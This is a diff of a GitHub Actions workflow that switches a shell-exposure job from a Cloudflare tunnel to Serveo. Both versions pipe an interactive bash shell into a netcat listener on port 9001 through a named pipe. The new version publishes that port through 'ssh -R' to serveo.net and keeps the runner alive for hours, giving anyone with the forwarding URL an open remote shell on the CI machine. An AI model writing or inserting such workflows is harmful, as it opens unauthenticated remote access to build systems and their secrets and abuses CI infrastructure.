@@ -1,4 +1,4 @@
-name: Cloudflare Tunnel and Reverse Shell
+name: Serveo Reverse Shell
 
 on:
   push:
@@ -15,37 +15,19 @@ jobs:
       - name: Install Dependencies
         run: |
           sudo apt update
-          sudo apt install -y wget unzip netcat-openbsd
+          sudo apt install -y openssh-client netcat-openbsd
 
-      - name: Download cloudflared
+      - name: Start Reverse Shell and Tunnel with Serveo
         run: |
-          wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-          sudo dpkg -i cloudflared-linux-amd64.deb
-
-      - name: Authenticate cloudflared
-        env:
-          CLOUDFLARE_AUTH_TOKEN: ${{ secrets.CLOUDFLARE_AUTH_TOKEN }}
-        run: |
-          cloudflared tunnel login --token "$CLOUDFLARE_AUTH_TOKEN"
-
-      - name: Create and Run Tunnel
-        run: |
-          cloudflared tunnel create github-actions-tunnel || true # Ignore if already exists
-          TUNNEL_ID=$(cloudflared tunnel list | grep "github-actions-tunnel" | awk '{print $1}')
-          echo "Tunnel ID: $TUNNEL_ID"
-          cloudflared tunnel run $TUNNEL_ID --url tcp://localhost:9001 &
-          echo "Cloudflare Tunnel running in the background..."
-          sleep 10 # Give it some time to establish
-
-      - name: Start Reverse Shell (Listening)
-        run: |
-          echo "=== Starting reverse shell (listening) ==="
+          echo "=== Starting Reverse Shell (Listening) ==="
           mkfifo /tmp/backpipe
           /bin/bash -i < /tmp/backpipe 2>&1 | nc -lvnp 9001 > /tmp/backpipe &
           sleep 5
-          echo "=== Netcat is listening on port 9001 ==="
-          echo "=== Check your Cloudflare Tunnel public URL to connect ==="
-          echo "You can find the URL in your Cloudflare Dashboard under Access -> Tunnels -> github-actions-tunnel -> Public Hostnames (TCP tab)."
+          echo "=== Starting Serveo Tunnel ==="
+          # Run Serveo in the background and try to forward port 9001
+          ssh -R 80:localhost:9001 serveo.net &
+          sleep 10
+          echo "=== Serveo Tunnel should be active. Check the logs for the forwarding URL. ==="
           # Keep workflow alive
           for i in {1..360}; do
             sleep 60
